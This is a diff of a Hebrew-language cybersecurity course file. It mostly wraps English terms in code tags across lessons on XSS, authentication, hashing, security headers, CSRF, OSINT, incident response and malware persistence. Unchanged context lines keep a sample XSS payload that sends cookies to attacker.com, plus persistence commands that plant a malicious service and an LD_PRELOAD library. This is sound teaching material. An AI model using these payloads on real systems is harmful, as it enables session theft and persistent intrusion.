+  <tr><td><strong><code>Reflected</code></strong></td><td>לא נשמר</td><td><code>Payload</code> ב-<code>URL</code> → חוזר ישירות ב-<code>response</code></td></tr>
+  <tr><td><strong><code>Stored/Persistent</code></strong></td><td>נשמר ב-<code>DB</code></td><td><code>Payload</code> נשמר → רץ על כל <code>visitor</code></td></tr>
+  <tr><td><strong><code>DOM-based</code></strong></td><td>ב-<code>JavaScript</code></td><td><code>Payload</code> ב-<code>fragment/location</code> → <code>DOM manipulation</code></td></tr>
 </table>
-<p><strong>Payload קלאסי — Cookie Theft</strong></p>
+<p><strong><code>Payload</code> קלאסי — <code>Cookie Theft</code></strong></p>
 <div class="code-preview"><pre><code># Reflected XSS — ב-URL
 https://site.com/search?q=<script>document.location='http://attacker.com/?c='+document.cookie</script>
 
@@ -6735,24 +6735,24 @@ Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict</code></pre></div>
         type: "explanation",
         title: "Authentication vs Authorization",
         content: `<div dir="rtl">
-<p><strong>Authentication vs Authorization</strong></p>
+<p><strong><code>Authentication</code> vs <code>Authorization</code></strong></p>
 <p>שני מושגים יסודיים שמתבלבלים לעתים קרובות:</p>
 <table class="content-table">
   <tr><th>מושג</th><th>שאלה</th><th>דוגמה</th></tr>
-  <tr><td><strong>Authentication (AuthN)</strong></td><td>מי אתה?</td><td>Login עם username+password</td></tr>
-  <tr><td><strong>Authorization (AuthZ)</strong></td><td>מה מותר לך?</td><td>רק admin יכול למחוק משתמשים</td></tr>
-  <tr><td><strong>MFA</strong></td><td>הוכח עוד פעם</td><td>SMS OTP, TOTP, hardware key</td></tr>
+  <tr><td><strong><code>Authentication</code> (<code>AuthN</code>)</strong></td><td>מי אתה?</td><td><code>Login</code> עם <code>username</code>+<code>password</code></td></tr>
+  <tr><td><strong><code>Authorization</code> (<code>AuthZ</code>)</strong></td><td>מה מותר לך?</td><td>רק <code>admin</code> יכול למחוק משתמשים</td></tr>
+  <tr><td><strong><code>MFA</code></strong></td><td>הוכח עוד פעם</td><td><code>SMS OTP</code>, <code>TOTP</code>, <code>hardware key</code></td></tr>
 </table>
-<p><strong>שיטות Authentication</strong></p>
+<p><strong>שיטות <code>Authentication</code></strong></p>
 <table class="content-table">
   <tr><th>שיטה</th><th>יתרון</th><th>חיסרון</th></tr>
-  <tr><td>Password</td><td>פשוט</td><td>ניתן לגניבה, brute-force</td></tr>
-  <tr><td>TOTP (Google Auth)</td><td>OTP מתחלף</td><td>מחייב מכשיר</td></tr>
-  <tr><td>WebAuthn/FIDO2</td><td>Phishing-resistant</td><td>מחייב hardware key/biometric</td></tr>
-  <tr><td>OAuth 2.0 / OIDC</td><td>SSO, לא שומר סיסמאות</td><td>מורכב</td></tr>
-  <tr><td>Certificate (mTLS)</td><td>חזק מאוד</td><td>ניהול certificates</td></tr>
+  <tr><td><code>Password</code></td><td>פשוט</td><td>ניתן לגניבה, <code>brute-force</code></td></tr>
+  <tr><td><code>TOTP</code> (<code>Google Auth</code>)</td><td><code>OTP</code> מתחלף</td><td>מחייב מכשיר</td></tr>
+  <tr><td><code>WebAuthn</code>/<code>FIDO2</code></td><td><code>Phishing-resistant</code></td><td>מחייב <code>hardware key</code>/<code>biometric</code></td></tr>
+  <tr><td><code>OAuth 2.0</code> / <code>OIDC</code></td><td><code>SSO</code>, לא שומר סיסמאות</td><td>מורכב</td></tr>
+  <tr><td><code>Certificate</code> (<code>mTLS</code>)</td><td>חזק מאוד</td><td>ניהול <code>certificates</code></td></tr>
 </table>
-<p><strong>JWT — JSON Web Tokens</strong></p>
+<p><strong><code>JWT</code> — <code>JSON Web Tokens</code></strong></p>
 <div class="code-preview"><pre><code># מבנה JWT: header.payload.signature
 eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xyz
 
@@ -6778,13 +6778,13 @@ HMACSHA256(base64url(header) + "." + base64url(payload), secret)
 <p><strong>איך לאחסן סיסמאות בצורה בטוחה</strong></p>
 <p>לעולם אל תאחסן סיסמאות בטקסט גלוי.</p>
 <p>גם <code>hash</code> רגיל כמו <code>MD5</code> או <code>SHA1</code> לא מספיק — כלי פיצוח כמו <code>rainbow tables</code> ו-<code>GPU cracking</code> שוברים אותם תוך שניות.</p>
-<p><strong>Password Hashing Functions</strong></p>
+<p><strong><code>Password Hashing Functions</code></strong></p>
 <table class="content-table">
   <tr><th>אלגוריתם</th><th>מה מוסיף</th><th>מומלץ?</th></tr>
-  <tr><td>MD5 / SHA1 / SHA256</td><td>כלום — מהיר מדי</td><td>❌ לא לסיסמאות</td></tr>
-  <tr><td><strong>bcrypt</strong></td><td>work factor (cost), salt built-in</td><td>✅ כן</td></tr>
-  <tr><td><strong>Argon2id</strong></td><td>memory-hard, time + memory cost</td><td>✅✅ הכי מומלץ</td></tr>
-  <tr><td><strong>scrypt</strong></td><td>memory-hard</td><td>✅ כן</td></tr>
+  <tr><td><code>MD5</code> / <code>SHA1</code> / <code>SHA256</code></td><td>כלום — מהיר מדי</td><td>❌ לא לסיסמאות</td></tr>
+  <tr><td><strong><code>bcrypt</code></strong></td><td><code>work factor</code> (<code>cost</code>), <code>salt</code> built-in</td><td>✅ כן</td></tr>
+  <tr><td><strong><code>Argon2id</code></strong></td><td><code>memory-hard</code>, <code>time</code> + <code>memory cost</code></td><td>✅✅ הכי מומלץ</td></tr>
+  <tr><td><strong><code>scrypt</code></strong></td><td><code>memory-hard</code></td><td>✅ כן</td></tr>
 </table>
 <div class="code-preview"><pre><code># Python — bcrypt
 import bcrypt
@@ -6800,7 +6800,7 @@ from argon2 import PasswordHasher
 ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
 hash = ph.hash(password)
 ph.verify(hash, password)  # מחזיר True/False</code></pre></div>
-<p><strong>Salt — מה זה ולמה חשוב</strong></p>
+<p><strong><code>Salt</code> — מה זה ולמה חשוב</strong></p>
 <p><code>Salt</code> הוא ערך אקראי שמוסיפים לסיסמה לפני חישוב ה-<code>hash</code>.</p>
 <p>כך שתי סיסמאות זהות מקבלות <code>hash</code> שונה — ו-<code>rainbow tables</code> הופכות לחסרות תועלת.</p>
 <p><code>bcrypt</code> ו-<code>Argon2</code> מוסיפים <code>salt</code> באופן אוטומטי.</p>
@@ -6825,20 +6825,20 @@ ph.verify(hash, password)  # מחזיר True/False</code></pre></div>
         type: "explanation",
         title: "HTTP Security Headers — שכבת הגנה קלה",
         content: `<div dir="rtl">
-<p><strong>Security Headers — ההגנה הנסתרת</strong></p>
+<p><strong><code>Security Headers</code> — ההגנה הנסתרת</strong></p>
 <p><code>HTTP response headers</code> יכולים להנחות את הדפדפן לאכוף מדיניות אבטחה.</p>
 <p>בעזרת כמה שורות קונפיגורציה, ניתן לחסום קטגוריות שלמות של מתקפות.</p>
-<p><strong>Headers חשובים</strong></p>
+<p><strong><code>Headers</code> חשובים</strong></p>
 <table class="content-table">
   <tr><th>Header</th><th>מה עושה</th><th>ערך מומלץ</th></tr>
-  <tr><td><strong>Content-Security-Policy</strong></td><td>מגביל מקורות JS, CSS, תמונות</td><td><code>default-src 'self'</code></td></tr>
-  <tr><td><strong>Strict-Transport-Security</strong></td><td>כופה HTTPS (HSTS)</td><td><code>max-age=31536000; includeSubDomains</code></td></tr>
-  <tr><td><strong>X-Frame-Options</strong></td><td>מונע Clickjacking (iframes)</td><td><code>DENY</code> או <code>SAMEORIGIN</code></td></tr>
-  <tr><td><strong>X-Content-Type-Options</strong></td><td>מונע MIME sniffing</td><td><code>nosniff</code></td></tr>
-  <tr><td><strong>Referrer-Policy</strong></td><td>מגביל דליפת URL ב-Referer</td><td><code>strict-origin-when-cross-origin</code></td></tr>
-  <tr><td><strong>Permissions-Policy</strong></td><td>מגביל APIs (מיקום, מצלמה)</td><td><code>geolocation=(), camera=()</code></td></tr>
+  <tr><td><strong><code>Content-Security-Policy</code></strong></td><td>מגביל מקורות <code>JS</code>, <code>CSS</code>, תמונות</td><td><code>default-src 'self'</code></td></tr>
+  <tr><td><strong><code>Strict-Transport-Security</code></strong></td><td>כופה <code>HTTPS</code> (<code>HSTS</code>)</td><td><code>max-age=31536000; includeSubDomains</code></td></tr>
+  <tr><td><strong><code>X-Frame-Options</code></strong></td><td>מונע <code>Clickjacking</code> (<code>iframes</code>)</td><td><code>DENY</code> או <code>SAMEORIGIN</code></td></tr>
+  <tr><td><strong><code>X-Content-Type-Options</code></strong></td><td>מונע <code>MIME sniffing</code></td><td><code>nosniff</code></td></tr>
+  <tr><td><strong><code>Referrer-Policy</code></strong></td><td>מגביל דליפת <code>URL</code> ב-<code>Referer</code></td><td><code>strict-origin-when-cross-origin</code></td></tr>
+  <tr><td><strong><code>Permissions-Policy</code></strong></td><td>מגביל <code>APIs</code> (מיקום, מצלמה)</td><td><code>geolocation=(), camera=()</code></td></tr>
 </table>
-<p><strong>Content Security Policy — דוגמאות</strong></p>
+<p><strong><code>Content Security Policy</code> — דוגמאות</strong></p>
 <div class="code-preview"><pre><code># בסיסי — רק מ-origin שלך
 Content-Security-Policy: default-src 'self'
 
@@ -6853,7 +6853,7 @@ Content-Security-Policy:
 
 # Report-only mode — לא חוסם, רק מדווח
 Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report</code></pre></div>
-<p><strong>HSTS — HTTP Strict Transport Security</strong></p>
+<p><strong><code>HSTS</code> — <code>HTTP Strict Transport Security</code></strong></p>
 <p><code>HSTS</code> אומר לדפדפן: לעולם אל תתחבר ב-<code>HTTP</code> — תמיד השתמש ב-<code>HTTPS</code>.</p>
 <p>הדפדפן שומר הוראה זו למשך הזמן שמוגדר ב-<code>max-age</code>.</p>
 <p>ההגדרה <code>preload</code> מאפשרת להכניס את הדומיין לרשימה מובנית בדפדפן — כך שגם הביקור הראשון יהיה מאובטח.</p>
@@ -6864,7 +6864,7 @@ Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report<
         type: "explanation",
         title: "CSRF — Cross-Site Request Forgery",
         content: `<div dir="rtl">
-<p><strong>CSRF — גרימת בקשות ממקור זדוני</strong></p>
+<p><strong><code>CSRF</code> — גרימת בקשות ממקור זדוני</strong></p>
 <p><code>CSRF</code> מנצלת את העובדה שהדפדפן שולח <code>cookies</code> אוטומטית עם כל בקשה.</p>
 <p>אתר זדוני יכול לגרום לדפדפן של הקורבן לשלוח בקשה לאתר שבו הוא מחובר — והבקשה תישלח עם ה-<code>cookie</code> של אותו אתר.</p>
 <div class="code-preview"><pre><code># תרחיש:
@@ -6909,28 +6909,28 @@ Set-Cookie: session=xyz; SameSite=Strict; Secure; HttpOnly
         type: "explanation",
         title: "Threat Intelligence — מה זה?",
         content: `<div dir="rtl">
-<p><strong>Threat Intelligence — מידע על איומים</strong></p>
+<p><strong><code>Threat Intelligence</code> — מידע על איומים</strong></p>
 <p><code>Threat Intelligence</code> (<code>TI</code>) הוא מידע על תוקפים, שיטות תקיפה, ומזהי פריצה (<code>IoCs</code> — Indicators of Compromise).</p>
 <p>מידע זה מאפשר לארגון לעבור מתגובה פסיבית לגישה פרואקטיבית.</p>
-<p><strong>סוגי Threat Intelligence</strong></p>
+<p><strong>סוגי <code>Threat Intelligence</code></strong></p>
 <table class="content-table">
   <tr><th>סוג</th><th>מקורות</th><th>קהל יעד</th></tr>
-  <tr><td><strong>Strategic</strong></td><td>דוחות, מגמות עולמיות</td><td>CISO, Management</td></tr>
-  <tr><td><strong>Operational</strong></td><td>Campaign analysis, TTPs</td><td>Security managers</td></tr>
-  <tr><td><strong>Tactical</strong></td><td>IoCs: IP, hash, domain</td><td>SOC analysts</td></tr>
-  <tr><td><strong>Technical</strong></td><td>Malware samples, exploits</td><td>Threat hunters</td></tr>
+  <tr><td><strong><code>Strategic</code></strong></td><td>דוחות, מגמות עולמיות</td><td><code>CISO</code>, <code>Management</code></td></tr>
+  <tr><td><strong><code>Operational</code></strong></td><td><code>Campaign analysis</code>, <code>TTPs</code></td><td><code>Security managers</code></td></tr>
+  <tr><td><strong><code>Tactical</code></strong></td><td><code>IoCs</code>: <code>IP</code>, <code>hash</code>, <code>domain</code></td><td><code>SOC analysts</code></td></tr>
+  <tr><td><strong><code>Technical</code></strong></td><td><code>Malware samples</code>, <code>exploits</code></td><td><code>Threat hunters</code></td></tr>
 </table>
-<p><strong>IoC — Indicators of Compromise</strong></p>
+<p><strong><code>IoC</code> — <code>Indicators of Compromise</code></strong></p>
 <p><code>IoCs</code> הם עדויות שמצביעות על כך שמכשיר או רשת נפרצו:</p>
 <ul>
-<li><strong>IP addresses</strong> — כתובות שרתי C2 (Command & Control)</li>
-<li><strong>File hashes</strong> — MD5/SHA256 של malware מוכר</li>
-<li><strong>Domains</strong> — דומיינים זדוניים (phishing, C2)</li>
-<li><strong>URLs</strong> — כתובות של payload delivery</li>
-<li><strong>Registry keys</strong> — persistence mechanisms ב-Windows</li>
-<li><strong>Mutexes</strong> — malware בודק אם כבר מותקן</li>
+<li><strong><code>IP addresses</code></strong> — כתובות שרתי <code>C2</code> (<code>Command & Control</code>)</li>
+<li><strong><code>File hashes</code></strong> — <code>MD5</code>/<code>SHA256</code> של <code>malware</code> מוכר</li>
+<li><strong><code>Domains</code></strong> — דומיינים זדוניים (<code>phishing</code>, <code>C2</code>)</li>
+<li><strong><code>URLs</code></strong> — כתובות של <code>payload delivery</code></li>
+<li><strong><code>Registry keys</code></strong> — <code>persistence mechanisms</code> ב-<code>Windows</code></li>
+<li><strong><code>Mutexes</code></strong> — <code>malware</code> בודק אם כבר מותקן</li>
 </ul>
-<p><strong>מסגרת MITRE ATT&CK</strong></p>
+<p><strong>מסגרת <code>MITRE ATT&CK</code></strong></p>
 <p>מסגרת פתוחה שממפה את ה-<code>TTPs</code> (Tactics, Techniques, Procedures) של קבוצות <code>APT</code>.</p>
 <p>14 שלבים: <code>Reconnaissance</code> &rarr; <code>Initial Access</code> &rarr; <code>Execution</code> &rarr; <code>Persistence</code> &rarr; ... &rarr; <code>Exfiltration</code> &rarr; <code>Impact</code>.</p>
 <div class="code-preview"><pre><code># דוגמת TTP: T1566.001 — Spearphishing Attachment
@@ -6944,20 +6944,20 @@ Set-Cookie: session=xyz; SameSite=Strict; Secure; HttpOnly
         type: "explanation",
         title: "OSINT — Open Source Intelligence",
         content: `<div dir="rtl">
-<p><strong>OSINT — מודיעין ממקורות פתוחים</strong></p>
+<p><strong><code>OSINT</code> — מודיעין ממקורות פתוחים</strong></p>
 <p><code>OSINT</code> הוא איסוף מידע ממקורות ציבוריים וגלויים.</p>
 <p>אנשי <code>Red Team</code> משתמשים בו ל-<code>Reconnaissance</code>.</p>
 <p>אנשי <code>Blue Team</code> משתמשים בו כדי להבין מה תוקפים פוטנציאליים יכולים לגלות על הארגון.</p>
-<p><strong>כלים ומקורות OSINT</strong></p>
+<p><strong>כלים ומקורות <code>OSINT</code></strong></p>
 <table class="content-table">
   <tr><th>כלי</th><th>מה מוצא</th></tr>
-  <tr><td><strong>Shodan</strong></td><td>מכשירי IoT, שרתים חשופים לאינטרנט עם ports פתוחים</td></tr>
-  <tr><td><strong>Censys</strong></td><td>סריקה של כל ה-IPv4 — certificates, banners, services</td></tr>
-  <tr><td><strong>theHarvester</strong></td><td>emails, subdomains, IPs ממנועי חיפוש</td></tr>
-  <tr><td><strong>Maltego</strong></td><td>גרף קשרים בין domains, IPs, organizations</td></tr>
-  <tr><td><strong>WHOIS / DNS</strong></td><td>רישום דומיין, nameservers, MX records</td></tr>
-  <tr><td><strong>Google Dorks</strong></td><td>site:, filetype:, inurl: לאיתור מידע רגיש</td></tr>
-  <tr><td><strong>Have I Been Pwned</strong></td><td>האם email נחשף ב-data breach</td></tr>
+  <tr><td><strong><code>Shodan</code></strong></td><td>מכשירי <code>IoT</code>, שרתים חשופים לאינטרנט עם <code>ports</code> פתוחים</td></tr>
+  <tr><td><strong><code>Censys</code></strong></td><td>סריקה של כל ה-<code>IPv4</code> — <code>certificates</code>, <code>banners</code>, <code>services</code></td></tr>
+  <tr><td><strong><code>theHarvester</code></strong></td><td><code>emails</code>, <code>subdomains</code>, <code>IPs</code> ממנועי חיפוש</td></tr>
+  <tr><td><strong><code>Maltego</code></strong></td><td>גרף קשרים בין <code>domains</code>, <code>IPs</code>, <code>organizations</code></td></tr>
+  <tr><td><strong><code>WHOIS</code> / <code>DNS</code></strong></td><td>רישום דומיין, <code>nameservers</code>, <code>MX records</code></td></tr>
+  <tr><td><strong><code>Google Dorks</code></strong></td><td>site:, filetype:, inurl: לאיתור מידע רגיש</td></tr>
+  <tr><td><strong><code>Have I Been Pwned</code></strong></td><td>האם <code>email</code> נחשף ב-<code>data breach</code></td></tr>
 </table>
 <div class="code-preview"><pre><code># Google Dorks — דוגמאות
 site:target.com filetype:pdf              # קבצי PDF
@@ -6971,7 +6971,7 @@ theHarvester -d target.com -b google,bing,linkedin -l 100
 # Shodan דוגמה
 hostname:target.com port:22               # SSH חשוף
 org:"Target Company" product:"Apache"     # Apache servers</code></pre></div>
-<p><strong>Passive vs Active Reconnaissance</strong></p>
+<p><strong><code>Passive</code> vs <code>Active Reconnaissance</code></strong></p>
 <p><strong>Passive:</strong> לא שולחים תעבורה ישירה ליעד — <code>WHOIS</code>, <code>Shodan</code>, <code>Google</code>.</p>
 <p><strong>Active:</strong> שולחים בקשות ישירות ליעד — <code>nmap</code>, <code>ping sweep</code>.</p>
 <p><strong>חשוב:</strong> <code>Active Recon</code> עלולה להיות בלתי חוקית ללא אישור מפורש.</p>
@@ -6996,19 +6996,19 @@ org:"Target Company" product:"Apache"     # Apache servers</code></pre></div>
         type: "explanation",
         title: "מחזור החיים של Incident Response",
         content: `<div dir="rtl">
-<p><strong>Incident Response (IR) — 6 שלבים</strong></p>
+<p><strong><code>Incident Response</code> (<code>IR</code>) — 6 שלבים</strong></p>
 <p><code>IR</code> הוא תהליך מסודר לזיהוי, בלימה וסגירת אירועי אבטחה.</p>
 <p>תקן <code>NIST SP 800-61</code> מגדיר 4 שלבים — בפועל משתמשים לרוב ב-6:</p>
 <table class="content-table">
   <tr><th>שלב</th><th>פעולות</th></tr>
-  <tr><td><strong>1. Preparation</strong></td><td>בניית IR team, כלים, runbooks, תרגולים</td></tr>
-  <tr><td><strong>2. Identification</strong></td><td>זיהוי האירוע — alert מ-SIEM, EDR, user report</td></tr>
-  <tr><td><strong>3. Containment</strong></td><td>בידוד מכשיר נגוע, חסימת IP, ניתוק מהרשת</td></tr>
-  <tr><td><strong>4. Eradication</strong></td><td>הסרת malware, patch, reset credentials</td></tr>
-  <tr><td><strong>5. Recovery</strong></td><td>שחזור שירותים, monitoring מוגבר</td></tr>
-  <tr><td><strong>6. Lessons Learned</strong></td><td>Post-mortem, עדכון כלים ו-runbooks</td></tr>
+  <tr><td><strong>1. <code>Preparation</code></strong></td><td>בניית <code>IR team</code>, כלים, <code>runbooks</code>, תרגולים</td></tr>
+  <tr><td><strong>2. <code>Identification</code></strong></td><td>זיהוי האירוע — <code>alert</code> מ-<code>SIEM</code>, <code>EDR</code>, <code>user report</code></td></tr>
+  <tr><td><strong>3. <code>Containment</code></strong></td><td>בידוד מכשיר נגוע, חסימת <code>IP</code>, ניתוק מהרשת</td></tr>
+  <tr><td><strong>4. <code>Eradication</code></strong></td><td>הסרת <code>malware</code>, <code>patch</code>, <code>reset credentials</code></td></tr>
+  <tr><td><strong>5. <code>Recovery</code></strong></td><td>שחזור שירותים, <code>monitoring</code> מוגבר</td></tr>
+  <tr><td><strong>6. <code>Lessons Learned</code></strong></td><td><code>Post-mortem</code>, עדכון כלים ו-<code>runbooks</code></td></tr>
 </table>
-<p><strong>כלי Forensics נפוצים</strong></p>
+<p><strong>כלי <code>Forensics</code> נפוצים</strong></p>
 <div class="code-preview"><pre><code># Volatility — Memory Forensics
 volatility -f memory.dmp --profile=Win10x64 pslist    # רשימת תהליכים
 volatility -f memory.dmp --profile=Win10x64 netscan   # חיבורי רשת
@@ -7032,24 +7032,24 @@ Get-ScheduledTask | Where-Object State -eq 'Ready'  # scheduled tasks</code></pr
         type: "story",
         title: "אירוע אמיתי — SolarWinds 2020",
         content: `<div dir="rtl">
-<p><strong>SolarWinds — Supply Chain Attack</strong></p>
-<p>דצמבר 2020: חברת <code>FireEye</code> גילתה שתוקפים מקבוצת <code>APT29</code> (Cozy Bear) חדרו לתוכנת ניהול ה-IT <code>Orion</code> של SolarWinds.</p>
+<p><strong><code>SolarWinds</code> — <code>Supply Chain Attack</code></strong></p>
+<p>דצמבר 2020: חברת <code>FireEye</code> גילתה שתוקפים מקבוצת <code>APT29</code> (Cozy Bear) חדרו לתוכנת ניהול ה-IT <code>Orion</code> של <code>SolarWinds</code>.</p>
 <p>העדכון הרגיל של התוכנה הפך לנשק סייבר.</p>
 <p><strong>שרשרת ההתקפה</strong></p>
 <ol>
-<li>תוקפים חדרו לסביבת הפיתוח של SolarWinds (SUNBURST)</li>
-<li>הזריקו backdoor ל-Orion DLL — SUNBURST malware</li>
-<li>SolarWinds שחררה update חתומה — 18,000 לקוחות התקינו</li>
-<li>SUNBURST "ישן" 2 שבועות לפני הפעלה — נמנע מ-sandbox detection</li>
-<li>C2 תקשורת דרך DNS — נראתה כ-legitimate traffic</li>
-<li>לקוחות כולל FireEye, Microsoft, US Treasury, DoD — נפגעו</li>
+<li>תוקפים חדרו לסביבת הפיתוח של <code>SolarWinds</code> (<code>SUNBURST</code>)</li>
+<li>הזריקו <code>backdoor</code> ל-<code>Orion DLL</code> — <code>SUNBURST malware</code></li>
+<li><code>SolarWinds</code> שחררה <code>update</code> חתומה — 18,000 לקוחות התקינו</li>
+<li><code>SUNBURST</code> "ישן" 2 שבועות לפני הפעלה — נמנע מ-<code>sandbox detection</code></li>
+<li><code>C2</code> תקשורת דרך <code>DNS</code> — נראתה כ-<code>legitimate traffic</code></li>
+<li>לקוחות כולל <code>FireEye</code>, <code>Microsoft</code>, <code>US Treasury</code>, <code>DoD</code> — נפגעו</li>
 </ol>
 <p><strong>לקחים</strong></p>
 <ul>
-<li><strong>Software Supply Chain</strong> — ה-update הרגיל הוא וקטור תקיפה</li>
-<li><strong>Code Signing</strong> — חתימה לא מספיקה אם CI/CD נפרץ</li>
-<li><strong>Zero Trust</strong> — גם software "מאמין" צריך לפעול עם minimal privilege</li>
-<li><strong>Network segmentation</strong> — היתה אמורה למנוע תנועה laterally</li>
+<li><strong><code>Software Supply Chain</code></strong> — ה-<code>update</code> הרגיל הוא וקטור תקיפה</li>
+<li><strong><code>Code Signing</code></strong> — חתימה לא מספיקה אם <code>CI/CD</code> נפרץ</li>
+<li><strong><code>Zero Trust</code></strong> — גם <code>software</code> "מאמין" צריך לפעול עם <code>minimal privilege</code></li>
+<li><strong><code>Network segmentation</code></strong> — היתה אמורה למנוע תנועה <code>laterally</code></li>
 <li>גורם ייחוס: ממשלת ארה"ב — רוסיה (SVR)</li>
 </ul>
 </div>`
@@ -7073,23 +7073,23 @@ Get-ScheduledTask | Where-Object State -eq 'Ready'  # scheduled tasks</code></pr
         type: "explanation",
         title: "סוגי Malware",
         content: `<div dir="rtl">
-<p><strong>Malware — סוגים ומאפיינים</strong></p>
+<p><strong><code>Malware</code> — סוגים ומאפיינים</strong></p>
 <table class="content-table">
   <tr><th>סוג</th><th>תיאור</th><th>דוגמה מפורסמת</th></tr>
-  <tr><td><strong>Virus</strong></td><td>מדביק קבצים, מתפשט בעצמו</td><td>CIH, Melissa</td></tr>
-  <tr><td><strong>Worm</strong></td><td>מתפשט ברשת ללא קובץ host</td><td>WannaCry, Slammer</td></tr>
-  <tr><td><strong>Trojan</strong></td><td>מסווה עצמו כ-software לגיטימי</td><td>Emotet, ZeuS</td></tr>
-  <tr><td><strong>Ransomware</strong></td><td>מצפין קבצים, דורש כופר</td><td>LockBit, REvil</td></tr>
-  <tr><td><strong>Rootkit</strong></td><td>מסתיר עצמו ב-OS kernel</td><td>TDSS, Necurs</td></tr>
-  <tr><td><strong>Spyware</strong></td><td>גנב מידע שקט</td><td>Pegasus, FinFisher</td></tr>
-  <tr><td><strong>RAT</strong></td><td>Remote Access Trojan — שליטה מלאה</td><td>Cobalt Strike, NjRAT</td></tr>
-  <tr><td><strong>Botnet</strong></td><td>רשת מכשירים נגועים</td><td>Mirai, Conficker</td></tr>
+  <tr><td><strong><code>Virus</code></strong></td><td>מדביק קבצים, מתפשט בעצמו</td><td><code>CIH</code>, <code>Melissa</code></td></tr>
+  <tr><td><strong><code>Worm</code></strong></td><td>מתפשט ברשת ללא קובץ <code>host</code></td><td><code>WannaCry</code>, <code>Slammer</code></td></tr>
+  <tr><td><strong><code>Trojan</code></strong></td><td>מסווה עצמו כ-<code>software</code> לגיטימי</td><td><code>Emotet</code>, <code>ZeuS</code></td></tr>
+  <tr><td><strong><code>Ransomware</code></strong></td><td>מצפין קבצים, דורש כופר</td><td><code>LockBit</code>, <code>REvil</code></td></tr>
+  <tr><td><strong><code>Rootkit</code></strong></td><td>מסתיר עצמו ב-<code>OS kernel</code></td><td><code>TDSS</code>, <code>Necurs</code></td></tr>
+  <tr><td><strong><code>Spyware</code></strong></td><td>גנב מידע שקט</td><td><code>Pegasus</code>, <code>FinFisher</code></td></tr>
+  <tr><td><strong><code>RAT</code></strong></td><td><code>Remote Access Trojan</code> — שליטה מלאה</td><td><code>Cobalt Strike</code>, <code>NjRAT</code></td></tr>
+  <tr><td><strong><code>Botnet</code></strong></td><td>רשת מכשירים נגועים</td><td><code>Mirai</code>, <code>Conficker</code></td></tr>
 </table>
-<p><strong>Static vs Dynamic Analysis</strong></p>
+<p><strong><code>Static</code> vs <code>Dynamic Analysis</code></strong></p>
 <table class="content-table">
   <tr><th>שיטה</th><th>מה בודקים</th><th>כלים</th></tr>
-  <tr><td><strong>Static</strong></td><td>הקובץ עצמו — strings, imports, headers</td><td>Ghidra, IDA Pro, strings, PEStudio</td></tr>
-  <tr><td><strong>Dynamic</strong></td><td>התנהגות בזמן ריצה — API calls, network</td><td>Cuckoo Sandbox, Process Monitor</td></tr>
+  <tr><td><strong><code>Static</code></strong></td><td>הקובץ עצמו — <code>strings</code>, <code>imports</code>, <code>headers</code></td><td><code>Ghidra</code>, <code>IDA Pro</code>, <code>strings</code>, <code>PEStudio</code></td></tr>
+  <tr><td><strong><code>Dynamic</code></strong></td><td>התנהגות בזמן ריצה — <code>API calls</code>, <code>network</code></td><td><code>Cuckoo Sandbox</code>, <code>Process Monitor</code></td></tr>
 </table>
 <div class="code-preview"><pre><code># Static Analysis — Linux
 file malware.exe                    # סוג הקובץ
@@ -7111,10 +7111,10 @@ objdump -d malware.exe | head -100  # disassembly
         type: "explanation",
         title: "Persistence Mechanisms",
         content: `<div dir="rtl">
-<p><strong>Persistence — איך Malware שורד Reboot</strong></p>
+<p><strong><code>Persistence</code> — איך <code>Malware</code> שורד <code>Reboot</code></strong></p>
 <p>נוזקה מחפשת דרך להמשיך לפעול גם אחרי <code>reboot</code>.</p>
 <p>הכרת מנגנוני <code>Persistence</code> חיונית לאנשי <code>IR</code> — הן לאיתור הנוזקה והן לניקוי מלא.</p>
-<p><strong>Windows Persistence</strong></p>
+<p><strong><code>Windows Persistence</code></strong></p>
 <div class="code-preview"><pre><code># Registry Run Keys (הנפוצות ביותר)
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@@ -7131,7 +7131,7 @@ sc create "WinHelper" binpath= "C:\malware.exe" start= auto
 
 # Startup Folder
 C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code></pre></div>
-<p><strong>Linux Persistence</strong></p>
+<p><strong><code>Linux Persistence</code></strong></p>
 <div class="code-preview"><pre><code># Cron jobs
 crontab -l              # של המשתמש הנוכחי
 cat /etc/crontab        # System-wide
@@ -7180,8 +7180,8 @@ echo "LD_PRELOAD=/tmp/malicious.so" >> /etc/environment</code></pre></div>
         type: "explanation",
         title: "היררכיית מערכת הקבצים",
         content: `<div dir="rtl">
-<h2>Filesystem Hierarchy Standard — FHS</h2>
-<p><strong>FHS</strong> — <code>Filesystem Hierarchy Standard</code></p>
+<h2><code>Filesystem Hierarchy Standard</code> — <code>FHS</code></h2>
+<p><strong><code>FHS</code></strong> — <code>Filesystem Hierarchy Standard</code></p>
 <p>תקן שמגדיר את מבנה עץ הקבצים של <code>Linux</code>.</p>
 <p>העץ כולו מתחיל בשורש אחד — <code>/</code>.</p>
 <p>כל רכיב במערכת — דיסקים, מכשירים, תהליכים — מיוצג כקובץ.</p>
@@ -7238,14 +7238,14 @@ echo "LD_PRELOAD=/tmp/malicious.so" >> /etc/environment</code></pre></div>
         type: "explanation",
         title: "פקודות חיוניות — ניפוי בעיות",
         content: `<div dir="rtl">
-<h2>ארגז הכלים של ה-SysAdmin</h2>
+<h2>ארגז הכלים של ה-<code>SysAdmin</code></h2>
 <p><strong>5 הפקודות הראשונות לניפוי בעיות</strong></p>
 <p>כשמשהו משתבש בפרודקשן, אלו הפקודות שתפעיל ראשונות:</p>
 <table class="content-table">
   <tr><th>פקודה</th><th>מה היא עושה</th></tr>
   <tr><td><code>ls -lah</code></td><td>רשימת קבצים עם הרשאות, גדלים ותאריכים</td></tr>
   <tr><td><code>grep -r "error" /var/log/</code></td><td>חיפוש רקורסיבי בטקסט — מוצא שגיאות בלוגים</td></tr>
-  <tr><td><code>ps aux</code></td><td>כל התהליכים הרצים — CPU, memory, PID</td></tr>
+  <tr><td><code>ps aux</code></td><td>כל התהליכים הרצים — <code>CPU</code>, <code>memory</code>, <code>PID</code></td></tr>
   <tr><td><code>ss -tulnp</code></td><td>פורטים פתוחים ואיזה תהליך מאזין לכל אחד</td></tr>
